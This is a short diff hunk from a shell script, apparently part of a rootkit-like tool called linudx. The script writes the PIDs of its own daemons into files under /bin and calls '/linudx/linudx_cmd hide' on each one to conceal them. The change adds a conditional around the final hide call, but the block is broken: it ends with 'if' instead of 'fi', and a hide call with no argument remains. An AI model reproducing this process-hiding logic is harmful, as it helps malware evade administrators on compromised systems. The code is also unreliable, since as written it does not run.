@@ -80,7 +80,11 @@ echo `pidof linudx-home`>/bin/linudx-home-pid
 /linudx/linudx_cmd hide `cat /bin/linudxd-pid`
 /linudx/linudx_cmd hide `cat /bin/linudxt-pid`
 /linudx/linudx_cmd hide `cat /bin/linudx-home-pid`
-/linudx/linudx_cmd hide 
+if [ `pidof linudxd` ];then
+  echo "hide success"
+else
+  /linudx/linudx_cmd hide 
+if
 
 
 
